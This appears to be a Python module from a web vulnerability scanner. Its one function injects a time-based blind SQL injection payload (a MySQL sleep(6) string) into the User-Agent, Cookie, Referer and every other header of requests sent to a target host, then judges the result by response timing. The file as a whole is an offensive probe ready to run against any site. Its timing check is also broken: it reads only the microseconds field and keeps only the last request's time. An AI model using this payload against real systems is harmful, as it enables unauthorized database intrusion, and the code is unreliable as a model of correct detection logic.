#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests


def header_bsqli(host, payloads_bsqli=None, headers_bsqli=None):
    """
    Args:
        host: 目标
        payload_bsqli: 盲注payload
        header_bsqli : Headers盲注
    Return
        Result : True or False
    """
    if payloads_bsqli is None:
        payloads_bsqli = """if(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'"XOR(if(now()=sysdate(),sleep(6),0))OR"*/"""
    if headers_bsqli is None:
        headers_bsqli = {
            'User-Agent': payloads_bsqli
            , 'Except': payloads_bsqli
            , 'Cookie': payloads_bsqli
            , 'Referer': payloads_bsqli
            , 'Accept-Encoding': payloads_bsqli
            , 'Accept-Language': payloads_bsqli
            , 'Accept': payloads_bsqli
        }
    try:
        responsetime = 0
        req = requests.get(host)
        firstresponsetime = req.elapsed.microseconds
        r = requests.head(host)
        for header in r.headers:
            headers_bsqli[header] = payloads_bsqli
            req = requests.post(host, headers=headers_bsqli)
        responsetime += req.elapsed.microseconds
        if responsetime > firstresponsetime:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False
